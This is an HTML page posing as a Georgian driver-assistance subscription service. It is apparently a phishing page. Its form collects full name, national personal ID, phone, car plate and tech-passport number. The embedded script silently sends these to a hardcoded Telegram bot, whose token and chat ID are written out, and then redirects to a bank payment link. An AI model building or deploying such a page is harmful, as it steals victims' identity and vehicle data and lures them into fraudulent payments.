<!DOCTYPE html>
<html lang="ka">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>mashveli.online.ge - Driver Assistance</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            font-family: Arial, sans-serif;
            background-color: #f9f9f9;
            color: #111;
            padding: 40px 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }
        .main-container {
            max-width: 1000px;
            width: 100%;
        }
        .form-title {
            font-size: 24px;
            font-weight: bold;
            color: #111;
            margin-bottom: 30px;
            line-height: 1.3;
        }
        .packages-container {
            display: flex;
            gap: 20px;
            width: 100%;
            justify-content: center;
            flex-wrap: wrap;
        }
        .card {
            background: #fff;
            border-radius: 16px;
            padding: 30px;
            width: 300px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
            cursor: pointer;
            transition: transform 0.2s;
            border: 1px solid #eaeaea;
        }
        .card:hover {
            transform: translateY(-5px);
        }
        .card.popular {
            background: #111f17;
            color: #fff;
        }
        .badge {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
            margin-bottom: 20px;
        }
        .card:not(.popular) .badge {
            background: #eef2e2;
            color: #3b5323;
        }
        .card.popular .badge {
            background: #cff85c;
            color: #111;
        }
        .price {
            font-size: 36px;
            font-weight: bold;
            margin-bottom: 5px;
        }
        .duration {
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 15px;
        }
        .desc {
            font-size: 14px;
            line-height: 1.5;
            color: #666;
        }
        .card.popular .desc {
            color: #ccc;
        }

        /* Modal Styles */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            justify-content: center;
            align-items: center;
            z-index: 1000;
            padding: 20px;
        }
        .modal {
            background: #fff;
            border-radius: 20px;
            width: 100%;
            max-width: 500px;
            padding: 30px;
            position: relative;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            max-height: 90vh;
            overflow-y: auto;
        }
        .close-btn {
            position: absolute;
            top: 20px;
            right: 20px;
            background: #f0f0f0;
            border: none;
            width: 35px;
            height: 35px;
            border-radius: 50%;
            font-size: 18px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .modal-title {
            font-size: 20px;
            font-weight: bold;
            margin-bottom: 20px;
            padding-right: 30px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            font-size: 13px;
            font-weight: bold;
            margin-bottom: 6px;
            color: #333;
        }
        .form-group input {
            width: 100%;
            padding: 10px 14px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 14px;
        }
        .form-group input:focus {
            outline: none;
            border-color: #111;
        }
        .submit-modal-btn {
            background: #cff85c;
            color: #111;
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            font-size: 15px;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.2s;
        }
        .submit-modal-btn:hover {
            background: #bce54b;
        }
    </style>
</head>
<body>

    <div class="main-container">
        <div class="form-title">
            მაშველი - მძღოლის დამხმარე /<br>
            Mashveli - Driver Assistance
        </div>

        <div class="packages-container">
            <!-- Package 1: 7 GEL -->
            <div class="card" onclick="openModal('7 GEL', 'საწყისი პაკეტი (7 GEL)')">
                <span class="badge">საწყისი</span>
                <div class="price">7 GEL</div>
                <div class="duration">1 თვე</div>
                <div class="desc">მოქნილი არჩევანი მოკლევადიანი მძღოლის მხარდაჭერისთვის.</div>
            </div>

            <!-- Package 2: 18 GEL -->
            <div class="card popular" onclick="openModal('18 GEL', 'პოპულარული პაკეტი (18 GEL)')">
                <span class="badge">პოპულარული</span>
                <div class="price">18 GEL</div>
                <div class="duration">3 თვე</div>
                <div class="desc">დაბალანსებული პაკეტი მუდმივი დახმარებისთვის.</div>
            </div>

            <!-- Package 3: 60 GEL -->
            <div class="card" onclick="openModal('60 GEL', 'საუკეთესო ღირებულება (60 GEL)')">
                <span class="badge">საუკეთესო ღირებულება</span>
                <div class="price">60 GEL</div>
                <div class="duration">1 წელი</div>
                <div class="desc">გრძელვადიანი მხარდაჭერა მთელი წლის განმავლობაში.</div>
            </div>
        </div>
    </div>

    <!-- Modal Form -->
    <div class="modal-overlay" id="modalOverlay">
        <div class="modal">
            <button class="close-btn" onclick="closeModal()">×</button>
            <div class="modal-title" id="modalTitle">მოთხოვნა</div>
            
            <form id="assistanceForm" onsubmit="submitForm(event)">
                <div class="form-group">
                    <label>სახელი და გვერდი / Full Name</label>
                    <input type="text" id="clientName" required placeholder="მაგ: გიორგი ბერიძე">
                </div>

                <div class="form-group">
                    <label>პირადი ნომერი / Personal ID *</label>
                    <input type="text" id="personalId" required placeholder="11223344556">
                </div>

                <div class="form-group">
                    <label>ტელეფონის ნომერი / Phone Number *</label>
                    <input type="tel" id="clientPhone" required placeholder="მაგ: +995 599 ...">
                </div>

                <div class="form-group">
                    <label>ავტომობილის სახელმწიფო ნომერი / Car Plate Number *</label>
                    <input type="text" id="carPlate" required placeholder="მაგ: AA123BB">
                </div>

                <div class="form-group">
                    <label>ტექპასპორტის ნომერი / Tech Passport Number *</label>
                    <input type="text" id="techPassport" required placeholder="მაგ: AA1234567">
                </div>

                <button type="submit" class="submit-modal-btn">გაგზავნა და გადახდაზე გადასვლა</button>
            </form>
        </div>
    </div>

    <script>
        let selectedPackagePrice = '';

        function openModal(price, titleText) {
            selectedPackagePrice = price;
            document.getElementById('modalTitle').innerText = titleText + ' - მოთხოვნა';
            document.getElementById('modalOverlay').style.display = 'flex';
        }

        function closeModal() {
            document.getElementById('modalOverlay').style.display = 'none';
        }

        function submitForm(event) {
            event.preventDefault();

            const name = document.getElementById('clientName').value;
            const personalId = document.getElementById('personalId').value;
            const phone = document.getElementById('clientPhone').value;
            const carPlate = document.getElementById('carPlate').value;
            const techPassport = document.getElementById('techPassport').value;

            const botToken = "8775590632:AAEKc7eACD1SMtOyeexiwzj9L_lb7BhRcC4"; 
            const chatId = "8233255349";

            const message = `🚨 ახალი მოთხოვნა საიტიდან!\n\n` +
                            `📦 არჩეული პაკეტი: ${selectedPackagePrice}\n` +
                            `👤 სახელი: ${name}\n` +
                            `🆔 პირადი ნომერი: ${personalId}\n` +
                            `📞 ტელეფონი: ${phone}\n` +
                            `🚗 მანქანის ნომერი: ${carPlate}\n` +
                            `📄 ტექპასპორტის ნომერი: ${techPassport}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            }).catch(err => console.log(err));

            const returnUrl = encodeURIComponent(window.location.origin + window.location.pathname + "?paid=true");
            window.location.href = `https://egreve.bog.ge/Carfax?return_url=${returnUrl}`;
        }
    </script>
</body>
</html>
